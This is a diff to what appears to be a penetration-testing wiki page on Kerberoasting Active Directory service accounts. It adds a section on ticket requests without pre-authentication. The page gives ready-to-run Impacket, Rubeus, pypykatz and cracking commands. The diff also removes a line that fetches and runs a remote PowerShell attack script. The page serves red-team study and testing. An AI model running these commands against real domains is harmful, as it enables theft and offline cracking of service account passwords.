@@ -15,12 +15,16 @@ In most situations, services accounts are machine accounts, which have very comp
 ## Practice
 
 {% hint style="warning" %}
-Unlike [ASREProasting](asreproast.md), this attack can only be carried out with a prior foothold (valid domain credentials).
+Unlike [ASREProasting](asreproast.md), this attack can only be carried out with a prior foothold (valid domain credentials), except in the [Kerberoasting without pre-authentication](kerberoast.md#undefined) scenario.
 {% endhint %}
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-The [Impacket](https://github.com/SecureAuthCorp/impacket) script [GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) (Python) can perform all the necessary steps to request a ST for a service given its SPN and valid domain credentials.
+The [Impacket](https://github.com/SecureAuthCorp/impacket) script [GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) (Python) can perform all the necessary steps to request a ST for a service given its SPN (or name) and valid domain credentials.
+
+{% hint style="info" %}
+> you can perform the Kerberoasting attack without knowing any SPN of the target account. But the existence of at least one SPN for the target account will continue to be needed.
+{% endhint %}
 
 ```bash
 # with a password
@@ -39,23 +43,18 @@ crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting kerberoastables
 Using [pypykatz](https://github.com/skelsec/pypykatz/wiki/Kerberos-spnroast-command) (Python) it is possible to request an RC4 encrypted ST even when AES encryption is enabled (and if RC4 is still accepted of course). The tool features an -e flag which specifies what encryption type should be requested (default to 23, i.e. RC4). Trying to crack `$krb5tgs$23` takes less time than for `krb5tgs$18`.
 
 ```bash
-python3 pypykatz kerberos spnroast -d $DOMAIN -t $TARGET_USER -e 23 'kerberos+password://DOMAIN\username:Password@IP'
+pypykatz kerberos spnroast -d $DOMAIN -t $TARGET_USER -e 23 'kerberos+password://DOMAIN\username:Password@IP'
 ```
 {% endtab %}
 
 {% tab title="Windows" %}
-The same thing can be done with [Rubeus](https://github.com/GhostPack/Rubeus) from a session running with a domain user privileges.
+[Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose.
 
+{% code overflow="wrap" %}
 ```bash
 Rubeus.exe kerberoast /outfile:kerberoastables.txt
 ```
-
-This can also be achieved with Powershell. Depending on the tool that the tester will use to attempt cracking the ???, the `-OutputFormat` can be set to `hashcat` or `john`.
-
-```bash
-iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
-Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII kerberoastables.txt
-```
+{% endcode %}
 {% endtab %}
 {% endtabs %}
 
@@ -68,6 +67,38 @@ hashcat -m 13100 kerberoastables.txt $wordlist
 ```bash
 john --format=krb5tgs --wordlist=$wordlist kerberoastables.txt
 ```
+
+### Kerberoast w/o pre-authentication
+
+In September 2022, [Charlie Cark](https://twitter.com/exploitph) explained how Service Tickets could be obtained through AS-REQ requests (which are usually used for TGT requests). He demonstrated (and [implemented](https://github.com/GhostPack/Rubeus/pull/139)) how to abuse this in a Kerberoasting scenario.
+
+If an attacker knows of an account for which pre-authentication isn't required (i.e. an [ASREProastable](asreproast.md) account), as well as one (or multiple) service accounts to target, a Kerberoast attack can be attempted without having to control any Active Directory (since pre-authentication won't be required).
+
+{% tabs %}
+{% tab title="UNIX-like" %}
+The [Impacket](https://github.com/SecureAuthCorp/impacket) script [GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) (Python) can perform all the necessary steps to request a ST for a service given its SPN (or name) and valid domain credentials.
+
+_At the time of writing, Sept. 28th 2022,_ [_the pull request (#1413)_](https://github.com/SecureAuthCorp/impacket/pull/1413) _adding the `-no-preauth` option for `GetUserSPNs.py` is pending._
+
+{% code overflow="wrap" %}
+```bash
+GetUserSPNs.py -no-preauth "bobby" -usersfile "services.txt" -dc-host "DC_IP_or_HOST" "DOMAIN.LOCAL"/
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="Windows" %}
+[Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose.
+
+_At the time of writing, Sept. 28th 2022,_ [_the pull request (#139)_](https://github.com/GhostPack/Rubeus/pull/139) _adding the `/nopreauth` option for Rubeus' `kerberoast` command is pending._
+
+{% code overflow="wrap" %}
+```bash
+Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"DOMAIN.LOCAL" /dc:"DC01.DOMAIN.LOCAL" /nopreauth:"nopreauth_user" /spn:"target_service"
+```
+{% endcode %}
+{% endtab %}
+{% endtabs %}
 
 ### Targeted Kerberoasting
 
@@ -82,3 +113,5 @@ Controlling a member of the [Account Operators](../domain-settings/builtin-group
 {% embed url="https://en.hackndo.com/kerberos" %}
 
 {% embed url="https://adsecurity.org/?p=2011" %}
+
+{% embed url="https://www.semperis.com/blog/new-attack-paths-as-requested-sts/" %}
